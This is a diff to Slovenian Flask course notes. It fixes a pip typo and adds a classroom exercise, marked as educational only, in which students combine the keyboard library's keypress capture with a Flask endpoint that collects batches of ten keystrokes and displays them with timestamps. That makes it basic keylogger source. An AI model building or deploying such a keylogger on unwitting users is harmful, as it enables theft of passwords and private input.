@@ -3123,7 +3123,7 @@ Tvoja naloga je, da s pomočjo Pythona, Flaska, Jinje in HTML-ja:
 **Ne pozabi na knjižnico dominantcolors**
 
 ```bash
-pip install flask requests dominantcolors!
+pip install flask requests dominantcolors
 ```
 
 **Namigi**
@@ -3164,3 +3164,70 @@ projekt/
 ```
 
 ![alt text](image-2.png)
+
+
+## Flask vaja 2 - KeyLogger
+
+<p style="color: red;"><strong>OPOMBA:</strong> Ta vaja je namenjena izključno izobraževalnim namenom!  </p>
+
+Kaj sploh je Key logging?
+
+https://www.wikiwand.com/en/articles/Keystroke_logging
+
+Potrebne knjižnice
+
+```bash
+pip install flask keyboard
+```
+
+Uporaba keyboard knjižnice
+
+```python
+import keyboard
+
+# Funkcija, ki se sproži ob pritisku tipke
+def on_key_press(event):
+    print(f'Pritisnjena tipka: {event.name}')
+
+# Registriramo funkcijo, ki "posluša" tipke
+keyboard.on_press(on_key_press)
+
+# Program teče dokler ne pritisnemo ESC
+keyboard.wait('esc')
+```
+
+Naloga:
+
+Združite zgornjo kodo s Flask strežnikom tako, da:
+
+1. V seznamu hranite zadnjih 10 pritisnjenih tipk
+2. Ko je seznam poln, pošljite podatke na Flask strežnik (da, ne obremenimo strežnika za vsak klik)
+3. Na spletni strani prikažite vse pretekle pritiske s časom
+
+Primer Flask dela
+
+```python
+from flask import Flask
+
+app = Flask(__name__)
+
+# Seznam za shranjevanje vseh tipk
+vse_tipke = []
+
+@app.route('/getKeys/<tipke>')
+def save_keys(tipke):
+    vse_tipke.append(tipke)
+    return f"OK. got {tipke} ", 200  
+
+@app.route('/')
+def index():
+    return render_template('index.html', tipke=vse_tipke)
+```
+
+Zahteve
+
+1. Naredite program, ki spremlja tipkovnico
+2. Ko je zbranih 10 tipk, jih pošljite na strežnik
+3. Ob obisku strani prikažite vse shranjene pritiske tipk (s timestampi)
+4. Program naj teče, dokler ne pritisnete ESC
+5. Nalogo poljubno zakompliciraj
